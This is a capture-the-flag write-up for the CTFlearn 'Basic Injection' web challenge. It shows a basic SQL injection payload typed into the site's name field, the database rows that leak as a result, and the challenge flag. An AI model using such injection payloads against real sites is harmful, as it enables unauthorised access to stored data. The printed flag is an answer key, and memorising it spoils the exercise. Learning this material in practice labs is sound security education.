<h1> Basic Injection </h1>

Problem Statement: <br><br>
See if you can leak the whole database using what you know about SQL Injections. <br><br>

Step-1: <br><br>
After visiting the given URL <a>https://web.ctflearn.com/web4/</a>, you will be asked to input something and then submit it. <br><br>

Step-2: <br><br>
Inspect the input text box. <br><br>
You will find the line given below. <br><br>
<code> Try some names like Hiroki, Noah, Luke </code> <br><br>

Step-3: <br><br>
You will find no flag even after submitting the above names. Now try basic SQL payloads in the existing database. <br><br>
I submitted the input <code> Lucifer' OR ' 1 = 1 </code>  and got the following output: <br><br>
<pre>
Name: Luke
Data: I made this problem.
Name: Alec
Data: Steam boys.
Name: Jalen
Data: Pump that iron fool.
Name: Eric
Data: I make cars.
Name: Sam
Data: Thinks he knows SQL.
Name: fl4g__giv3r
Data: CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}
Name: snoutpop
Data: jowls
Name: Chunbucket
Data: @datboiiii
</pre>
<br>
Step-4: <br><br>
The desired flag <code> CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}</code> can be found in line number 12 of the above output.
